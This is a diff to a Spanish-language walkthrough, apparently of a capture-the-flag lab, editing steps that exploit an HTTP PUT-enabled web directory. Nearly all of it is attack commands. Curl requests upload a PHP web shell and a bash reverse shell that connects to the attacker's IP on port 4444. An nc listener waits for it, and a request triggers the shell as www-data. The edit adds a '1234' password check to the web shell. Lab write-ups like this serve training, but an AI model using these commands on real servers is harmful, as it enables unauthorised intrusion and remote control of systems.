@@ -101,7 +101,7 @@ curl -v -T shell.php http://VICTIM_IP/test/shell.php
 4. Como alternativa, puedes subir los ficheros al directorio vulnerable sin crear archivos peligrosos en tu ordenador.
 ```bash
 curl -v -X PUT --data 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' http://VICTIM_IP/test/rev.sh
-curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://VICTIM_IP/test/shell.php
+curl -v -X PUT -d '<?php if($_GET["pass"] == "1234"){ system($_GET["cmd"]);} ?>' http://VICTIM_IP/test/shell.php
 ```
 5. En la terminal 2, se pone a la escucha en el puerto configurado en la **reverse shell** del paso 2.
 ```bash
@@ -109,7 +109,7 @@ nc -lvnp 4444
 ```
 6. Se ejecuta el archivo PHP, provocando que la víctima se conecte de vuelta.
 ```bash
-curl "http://VICTIM_IP/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
+curl "http://VICTIM_IP/test/shell.php?pass=1234&cmd=bash%20/var/www/html/test/rev.sh"
 ```
 Como resultado, se obtiene una shell con el usuario **www-data**, con privilegios limitados.
 7. Navega hasta el directorio donde se encuentra la primera flag.
